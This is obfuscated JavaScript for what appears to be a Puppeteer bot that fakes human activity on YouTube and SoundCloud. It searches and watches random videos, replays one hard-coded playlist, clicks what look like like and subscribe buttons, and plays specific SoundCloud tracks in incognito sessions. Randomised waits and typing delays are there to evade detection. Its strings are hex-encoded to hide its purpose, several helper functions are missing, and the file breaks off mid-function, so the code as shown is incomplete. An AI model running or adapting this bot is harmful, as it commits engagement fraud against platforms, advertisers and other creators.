const Z = d,
  Y = c,
  X = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1 * -0x136c + 0xdf * -0x15 + 0x25b8))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x957 + -0x1d83 + 0x142c), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xa385 + 0x3014 * -0x4 + 0x1d905 + (0x2de9 + -0x18d + 0x71e * 0x2) * random()) : await standardWaitForNetIdle(f), await wait(0x2 * -0x61c + -0x1ea1 + 0x3e61 + (0x3e55 + 0x71 * 0x99 + 0x18a * -0x3b) * random()), 0x13a * 0xb + -0xc9f + 0x4a * -0x3;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xea9 + 0x7 * 0x579 + -0x2170), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x11da + 0xb2e + -0x6ad * -0x1;
}

function a() {
  const bp = [
    'zxjYB3i',
    ')\x20AppleWeb',
    'e/*',
    'CMCVzw4VC2nYAq',
    '-play-butt',
    'zg9pvuPt',
    'ksbbChbSzvDLyG',
    'W7WIW73dSshdSCkhW7iawW',
    'B21VBY5PBYb0CG',
    'lwL0C2vSzI0ZyG',
    'ESojW58pDsG',
    'W4/cRWeOWPtcOSkoxqGl',
    'y2XVC2u',
    'ChrZlZqWntK0mW',
    'dLj5fIupdA',
    'Safari/537',
    'ate,\x20br',
    'mCkgWROcBmoMW6TQoGa',
    'WQxdQgxcQNFcMSoceNqR',
    'BmkcWO5AzCkfWRKprdq',
    'W4pcJmo2sW',
    'torAll',
    'zMLUywXPEMu',
    'Ahr0Chm6lY9VCa',
    'ML,\x20like\x20G',
    'DJaUnG',
    'CMvJDa'
  ];
  a = function() {
    return bp;
  };
  return a();
}
async function randomWait() {
  return await wait(0x6d * -0x2 + 0xd * 0x1d8 + -0x396 + (0x19b * 0x17 + 0x7e4 + -0x1949 * 0x1) * random()), 0xf4 * 0x23 + 0x1b6e + -0x27 * 0x18f;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1c4c * 0x1 + 0x308 + 0x1944, 0x19 * -0xf1 + 0x1f7 * -0xa + 0x2b36), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x196 * 0xa6 + -0x17 * -0x1209 + 0x52d5) * getRandomInt(-0x1065 * 0x1 + -0x1fff + 0x19d * 0x1e, -0x4e9 + -0x1 * -0xbf7 + -0x709), h)), 0x205 * 0xb + -0x45 * -0x39 + 0x1 * -0x2593;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x35b * -0x4 + -0x82 * -0x2a + 0x458 * -0x8;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1664 * 0x1 + -0xf2 * 0x1a + -0x33 * -0xb]['split']('\x20');
    for (let k = 0xb * 0x8f + 0x1 * -0x8da + 0x2b5; k < i['length']; k += 0x18b3 * -0x1 + -0x1aa6 + -0x335b * -0x1)
      j += i[k] * h[i[k + (-0x25 * 0x9b + 0x751 + 0xf17)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = b,
      R = d,
      j = Array['from'](document['querySelec' + R(0x15)]('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x13be + -0x59 * 0x8 + -0x168c * -0x1)['map'](l => Array[S(0x14, '^cR8')](l['children']))['flat'](0x5 * 0x526 + 0x2678 + -0x4035)['map'](l => l['childNodes'][0x4 * 0x41d + -0x26ef + 0x167c * 0x1]['childNodes'][-0x2664 + -0x1ab9 * 0x1 + 0x411d]['childNodes'][-0x1e6d + -0x49 * 0x39 + 0x275 * 0x13]['childNodes'][-0x1d9b + 0xcdd + 0x10be]['childNodes'][0x157d * 0x1 + -0x1efd + 0x981]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0xfd0 * -0x2 + 0x1555 * 0x1 + -0x310d, -0x91a + 0xccf * -0x2 + 0x3640)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x17 * -0x101 + 0x6f02 * 0x1 + -0x1d53);
  const h = await getMaxTime(f),
    i = Math['min']((0x1909e + 0x917d + -0x3 * 0x67e9) * getRandomInt(0x5d * -0x13 + -0x6 * -0x3eb + 0x1 * -0x1099, 0x189 * 0xb + 0xd69 * 0x1 + -0x1e47), h);
  return await wait(i), -0x50a + 0x47 * -0x49 + 0x194a;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xa61 * -0x1 + -0x34f + -0x712]['children'][0x16be * 0x1 + -0x93 * 0x2e + 0x3ac]['children'][0x789 + -0x1 * -0x12ad + -0x1a36]['children'][0x1e9e + -0x1d00 + -0x17 * 0x12]['children'][0x7f * -0x3e + 0x129f + 0xc23]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x373 * 0x1 + -0x4 * 0x3be + 0x126c;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1 * -0x2503 + -0x1606 * -0x1 + -0xf61 * -0x1 + (-0x120d + 0xe52 + 0x3ed) * random()
  }), await wait(0x1a66 + 0x2105 + 0x1 * -0x3977 + (0x504 + -0x977 * 0x3 + 0x82f * 0x3) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1cca + 0x256 * -0x4 + -0x1370]['childNodes'][-0x268b + 0x1 * -0x232d + 0x49b9]['childNodes'][0x2 * 0xbb1 + -0x2 * 0x3c6 + -0x1 * 0xfd5]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x25db + -0x190 + -0x2770 * -0x1]['childNodes'][-0x1cc6 + 0x631 * 0x6 + -0x860]['childNodes'][-0xb * 0x320 + -0x43 * -0x7a + 0x274]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x201b + -0xb0 * -0x27 + 0x54c),
          r = -0x1feb + 0x5 * 0x77d + -0x586;
        for (let u = 0x25a6 + -0x1 * -0x25c + -0x2802; u < q['length']; u += 0x2 * 0xa7a + 0x643 * -0x5 + -0x7 * -0x17b)
          r += q[u] * k[q[u + (-0x9e * -0x2c + 0x11e9 + -0x2d10)]];
        return r;
      }(n);
  });
  await wait((-0x12 * 0x60a + -0x225f + 0xc9ab) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x7f * -0x64 + 0x14b1 * -0x2 + 0xe226) * getRandomInt(0x7 * -0x142 + -0x938 + -0xd * -0x163, 0x1 * 0x2650 + -0x182e + 0x8 * -0x1c3), h + (0x16b * -0x15 + 0xfa4 + 0x21ab));
  return await wait(i), 0x2260 * -0x1 + -0x1 * -0x355 + 0x1f0c * 0x1;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1701 + 0xa79 + -0x5 * 0x6b2), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const T = d;
        document['querySelec' + 'tor']('.ytp-large' + T(0x4) + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x1214 + -0x197b + 0x131f + (-0x158 * 0x1 + -0x2307 + -0x1 * -0x2847) * Math['random']());
    });
  }, 0x1 * 0x48f + -0x35 * -0x71 + 0x4e * -0x2);
  await wait(-0xae28 * 0xa + 0xf8d4 + -0x5 * -0x214ec);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x8fb4 + 0xb96 + 0x66e * 0x39) * getRandomInt(0xa * -0x167 + -0x4 * -0x6af + 0x32 * -0x41, 0x1b15 + 0xe06 + -0xb5 * 0x3a)), clearInterval(h), -0x596 + 0x2298 + -0x1d01;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x239 * -0xb + -0x1a02 + -0x1 * -0x3275;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0xdef + -0x1 * -0x543 + -0x1331;
    await randomWait();
  }
  return -0x6 * -0x2bd + -0x2046 + 0xfd9;
}

function fetchRandomSC() {
  return Math['random']() <= 0x9d * -0x21 + 0x1 * 0x12e9 + 0x44 * 0x5 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xf04 + 0x10b0 + 0x1ac * -0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const W = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x24a3 + 0xab0 + 0x19f3 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0xd51 + 0x1b4c + -0x289d;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x4ba * 0x19 + 0x52e5 + -0x86d * 0x3 + getRandomInt(0x367e + -0xe * -0x10c + -0xa8e, -0x5bec + -0x336c + -0x2b6c * -0x6));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x240d + 0x2691 + -0x4a9d), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x894 + -0x1912 * -0x1 + 0x107e * -0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1 * -0x140d + -0xbd2 + 0x1fdf, 0x9b * 0x7 + -0x473 * 0x4 + -0x1f7 * -0x7)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1 * -0x455 + 0x29b * 0x4 + -0x6f1 * 0x1 + floor((-0x1936 + 0x89c + 0x2ee * 0x7) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x5c7cd644 + -0xdeb92cd8 + 0x1023c5694),
          0x4fde1d * -0x1 + 0x67caee + 0x68132f,
          0x39e4 + -0xc00c + 0x20c5 * 0x8,
          0x234b * 0x1 + -0x1595 + 0xd36 * -0x1
        ], y = [
          -0x1 * -0x136f + 0x2022 * 0x1 + 0x1 * -0x3379,
          -0x1 * 0x65e + 0x7b3 * 0x5 + -0x2011 * 0x1,
          0x163e + -0x1 * 0xe53 + -0x7e3,
          0x6e1 + -0x49 * 0x34 + 0x1 * 0x7f3
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0xbff + 0x1 * -0x493 + 0x1093)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x385 + 0x439 + -0x7be; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x215b + 0x259c * 0x1 + -0x441) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x81 + 0x2f9 * 0x1 + 0x37a * -0x1] = A[-0x25 * -0x37 + -0x1 * -0x5af + 0x3 * -0x486] = A[0x1 * -0x1c53 + 0x1d3c * 0x1 + -0xe8] = A[-0xc73 * -0x3 + 0x1f09 + -0x8 * 0x88c] = A[-0xf * -0x25a + -0xc2e + -0x1715] = A[-0x14f6 + -0x10c6 + -0x1 * -0x25c0] = A[-0xdb1 * -0x2 + -0x247f * 0x1 + -0x7 * -0x14e] = A[0x3 * -0x486 + 0xb + -0x1 * -0xd8d] = A[-0x1 * 0xfc1 + -0x1aaf + 0x2a77] = A[0x1 * 0x4 + -0x1198 + 0xa1 * 0x1c] = A[-0x2 * 0x10cb + 0x609 + 0xb * 0x282] = A[-0x1af8 + -0x139 + 0x3 * 0x969] = A[0xf49 + 0x14e4 + -0x4a * 0x7d] = A[-0x4 * 0x554 + 0x1420 + 0x9e * 0x2] = A[0x79c + 0x13 * -0x1cd + 0x1aa8] = A[0xb5c + 0x87e + 0xb5 * -0x1c] = A[-0x1b37 + 0x39 * 0x9d + -0x7af] = 0x5 * -0x86 + -0x1 * 0x221b + -0x77 * -0x4f, this['blocks'] = A) : this['blocks'] = [
                0x2360 + -0x244c + 0xec * 0x1,
                0x1292 + 0x21f * -0x1 + -0x1073,
                -0xacf * 0x1 + 0x1fd5 + -0x1506,
                0x15c8 + 0x26e3 + -0x3cab,
                0x1ca5 + 0x7 * 0x2ba + -0x2fbb,
                0x1 * -0x139b + -0x6b * -0x7 + 0xe * 0x131,
                0x1 * -0x1a2c + 0x411 + -0x161b * -0x1,
                0x3 * -0x7e2 + -0x13e + 0x18e4,
                -0xa46 + 0x22c3 + -0x187d,
                0x2191 + -0x11ca + -0xfc7,
                -0x16b0 + 0x94e + 0xd62,
                -0x1469 + 0x7 * -0x3d + 0x1614,
                0x2585 + -0x329 * 0x1 + -0x225c,
                -0xa0f * 0x1 + 0x1e7 * -0x8 + 0x1947,
                0x8 * 0x4cf + -0xb5 * -0xa + -0x2d8a,
                0x1609 + 0x5 * 0x7f + 0x82c * -0x3,
                0x13 * -0x1d + 0x1af4 + -0x18cd
              ], this['h0'] = -0x3 * 0x53435f9 + 0x3fd633e4 + 0x370b9108, this['h1'] = 0x3b597dbb + 0xb039d8dc + 0x1 * 0x43a54f2, this['h2'] = 0x9318db4c + -0x11dc7b1 * -0x57 + -0x5b7cdb75, this['h3'] = -0x19ed2556 + 0x1e161cb + -0x1cb257 * -0x167, this['h4'] = -0x9b8f58b * -0xe + 0x4 * -0x1deafbfa + 0xb361643e, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x11b2 * -0x1 + 0x2 * 0x1046 + -0xeda, this['finalized'] = this['hashed'] = 0xf14 + -0x6 * -0x4bc + -0x4 * 0xadf, this['first'] = 0x23f4 + 0x1ff * 0x9 + -0x67 * 0x86;
            }
            ['update'](J) {
              const U = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = U(0xa, 'd9Gi') != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x3ad * -0x1 + 0x237e + -0x21f * 0xf, O = J['length'] || 0x3 * -0x2e2 + -0xb * 0x31 + 0xac1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1125 + -0x13d9 + 0x2b4, P[0x1e51 + 0x2 * -0x4a8 + -0x13 * 0x11b] = this['block'], P[0x1429 + 0x21 * -0x43 + -0xb76] = P[-0x1321 + 0x49 * 0x5 + 0x11b5] = P[0x4c * -0xd + 0x7c2 + 0x3 * -0x14c] = P[0x1dc2 + -0x1027 + -0xd98] = P[-0x1661 * 0x1 + 0x1d * -0x3 + 0x16bc] = P[-0x172b + 0x8b5 + 0xe7b] = P[0xc43 * 0x1 + -0x38 * -0xa3 + -0x3 * 0xff7] = P[-0x377 * 0x2 + 0x76 * 0x5 + 0x4a7 * 0x1] = P[-0x14e0 + 0x2610 + -0x1128] = P[0x2355 + 0x2ab * -0xb + 0x5f3 * -0x1] = P[0x9c7 * -0x1 + -0x1b3 * 0xf + 0x234e] = P[0x2274 + -0x242 + -0x1 * 0x2027] = P[-0x626 * -0x2 + -0x95b + 0x3 * -0xf7] = P[-0x1ada + -0x3b9 * 0x5 + 0x2d84] = P[0x1 * -0x21ef + 0x1492 + 0xd6b] = P[0xc56 * 0x2 + -0xc00 + -0x1 * 0xc9d] = -0x70d + -0x4f * -0x3e + -0xc15), K) {
                    for (N = this['start']; M < O && N < -0x622 * 0x1 + 0x1d99 + 0x1 * -0x1737; ++M)
                      P[N >> -0x182 + -0x1 * -0x1fe7 + 0x1e63 * -0x1] |= J[M] << y[-0x287 + -0x12b5 * 0x1 + 0x153f & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xc16 + 0x1c18 + 0xfc2 * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < -0x1ecd + -0x3c1 * 0x1 + 0x230e ? P[N >> -0x1865 + -0x1 * 0x9f5 + 0x225c] |= L << y[-0x2 * -0x153 + 0x193 * 0xb + -0x13f4 & N++] : L < -0x171b + 0x2347 + -0x164 * 0x3 ? (P[N >> 0xcfb * 0x3 + -0x2483 + -0x26c] |= (-0x1bb * -0x15 + -0x12 * 0xf9 + -0x1215 | L >> 0x23f + 0xb46 + -0xd7f) << y[0xbd7 + -0x452 * 0x1 + -0x782 & N++], P[N >> -0x1 * 0xf25 + -0x499 * -0x5 + -0x7d6] |= (-0x1c69 + -0x7 * 0x22 + -0x1dd7 * -0x1 | 0x1a6f + 0x18b7 + -0x32e7 * 0x1 & L) << y[0x205 + 0xac5 + -0xcc7 & N++]) : L < 0xd32a + -0xa970 + -0x1 * -0xae46 || L >= 0xa61 * 0x25 + 0x15eb1 + 0x1feb6 * -0x1 ? (P[N >> -0x45 * 0x39 + 0x4eb * -0x2 + -0x3 * -0x867] |= (0x17ce + -0x6a5 + 0x1049 * -0x1 | L >> -0x26d + 0xdcd + -0x64 * 0x1d) << y[-0x208a + 0x367 + 0x1d26 & N++], P[N >> 0x1023 * 0x1 + -0x4 * -0x731 + -0x2ce5] |= (-0x1b2e + 0x1 * -0x2659 + 0x4207 | L >> -0x1 * 0x102b + -0x1de6 + 0x51f * 0x9 & -0x674 * -0x2 + 0x1 * 0xeec + -0x17 * 0x133) << y[0x5c2 * -0x2 + 0xd * 0x2ce + -0x18ef & N++], P[N >> 0x2 * -0xb57 + -0x3 * -0xa3f + 0xe5 * -0x9] |= (0x1c97 + 0x303 + -0x1f1a | 0x2 * -0xfc2 + 0x199d + 0x626 & L) << y[0x119d * 0x1 + 0xbc3 + -0x1 * 0x1d5d & N++]) : (L = -0x1200 * -0xb + 0x11c28 + -0xe228 + ((-0x3d * 0x95 + -0x1 * 0x1a02 + 0x4182 & L) << -0x23db + 0x2d * -0x11 + 0x67b * 0x6 | -0x1 * 0xd53 + 0x1 * 0x36 + 0x111c & J['charCodeAt'](++M)), P[N >> 0x9b * 0x2 + 0x7 * 0x2a7 + -0x13c5] |= (-0x1 * 0x22f + -0xf9b + 0x12ba | L >> 0x58f * 0x2 + -0x1 * -0x25ed + 0x255 * -0x15) << y[0x20a1 + -0x3c5 + -0x5 * 0x5c5 & N++], P[N >> -0x24c5 + 0x12ad + 0x121a] |= (0x2261 + -0xe0b + -0x13d6 | L >> -0x12 * -0x24 + 0xfa7 + -0x1 * 0x1223 & -0x18df + 0x217 * -0x1 + -0x7 * -0x3e3) << y[0x1296 + -0x5f * -0x6 + -0xd5 * 0x19 & N++], P[N >> -0x21aa + 0x103 + 0x1 * 0x20a9] |= (0x2b * -0x7 + -0xf0 * -0xe + -0xb73 * 0x1 | L >> -0x17 * -0x3a + 0x1fc + -0x72c & -0x2565 * -0x1 + 0x1 * -0x1a61 + -0xac5) << y[0x3a * 0x26 + 0x1b71 + 0x1 * -0x240a & N++], P[N >> 0xd94 + 0x1dc8 + -0x2b5a] |= (0x9b4 + -0x134a + 0xa16 | -0x31d + 0x42c + -0x4 * 0x34 & L) << y[-0x1 * 0x1cb7 + 0x16a2 + 0x618 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x5b * 0x5b + 0x202e + -0x4047 ? (this['block'] = P[-0x1696 + -0xadd + 0x2183], this['start'] = N - (0xa97 * -0x1 + 0xb75 + -0x9e), this['hash'](), this['hashed'] = 0xc * 0x265 + 0x676 * -0x2 + 0xd5 * -0x13) : this['start'] = N;
                }
                return this['bytes'] > 0xc41f5d8f + -0x11134e73f * 0x1 + 0x12237b * 0x125d && (this['hBytes'] += this['bytes'] / (0xbe04 * -0x1cc13 + -0xc * -0x1cf7b557 + -0x202d6e * -0x7c4) << 0x2 * 0x12df + 0x2da + 0x18 * -0x1b1, this['bytes'] = this['bytes'] % (-0xe5040 * -0x145a + -0x4feed538 + 0x2ca19eb8)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x10e5 * 0x1 + -0x10be * -0x2 + -0x3260;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x3 * 0x255 + -0x764 + 0x3 * 0x27] = this['block'], J[K >> -0x1 * -0x1921 + 0x82 + -0x19a1] |= x[0x1 * -0x1931 + -0x202d * -0x1 + 0x77 * -0xf & K], this['block'] = J[0x14ed * 0x1 + -0x2705 + -0x8 * -0x245], K >= 0x14de + 0xb * -0xfe + 0x2 * -0x4de && (this['hashed'] || this['hash'](), J[0x12 * -0x10b + -0xfe3 * 0x2 + 0x328c] = this['block'], J[0x2 * -0xec0 + -0x24df + 0x426f] = J[0x1181 * 0x1 + -0x494 * 0x4 + 0x34 * 0x4] = J[0x123 * -0x11 + 0x2494 + -0x5 * 0x373] = J[-0x2003 + -0x88 + 0x208e] = J[-0x1a9 + 0x1 * -0x2433 + 0x650 * 0x6] = J[-0x6 * 0x653 + 0x16c4 + 0xf33] = J[0x1 * 0x881 + -0x25e9 + 0x1d6e] = J[0x77 * -0x1c + -0xd * -0x219 + -0xe3a] = J[-0xe8 + -0x95e + 0xa4e] = J[0x80b * -0x1 + -0x2 * -0xe7b + 0x12 * -0x129] = J[0x3 * -0xbdd + -0x908 + 0x2ca9] = J[0x87 * -0x16 + -0xb3 + -0xa * -0x13c] = J[0x169 * 0x12 + 0x1d5e + 0x3 * -0x123c] = J[0x1d74 + -0x2 * -0xf3e + 0x3be3 * -0x1] = J[0xe5c + -0x5ab + -0x8a3] = J[-0x1c11 + 0x45f * -0x7 + 0x3ab9] = -0x234a * 0x1 + 0x22 * -0x42 + 0x2c0e), J[-0xddb * 0x1 + 0x16b4 * 0x1 + -0x8cb] = this['hBytes'] << -0x27 * -0xdf + 0x10ed * -0x2 + -0x1c * 0x1 | this['bytes'] >>> -0x4b3 + 0x3 * 0xcdb + 0x21c1 * -0x1, J[0x796 * 0x1 + -0x1f6 + 0x5 * -0x11d] = this['bytes'] << 0x4 * -0x61f + -0x2087 + 0x32b * 0x12, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x2547 + 0x2257 + -0x4 * -0xc0; J < 0x1de6 + -0x2305 + -0xd * -0x6b; ++J)
                K = Q[J - (-0x73d + -0x151 * 0xf + 0x1aff * 0x1)] ^ Q[J - (0x1 * 0x1b82 + 0x24b + 0x1dc5 * -0x1)] ^ Q[J - (0xa71 + -0xefc + 0x499)] ^ Q[J - (0x17a5 + 0x18bb + -0x4 * 0xc14)], Q[J] = K << -0x137f + -0xb3f * -0x2 + -0x2fe * 0x1 | K >>> -0x1aa2 + -0xc4d * 0x1 + 0x270e;
              for (J = 0x1 * -0xdf + 0x120f + -0xdc * 0x14; J < 0x3 * 0xa1d + -0x67 * 0xb + -0x19d6; J += 0x29 * 0xbb + -0x638 + -0x17b6)
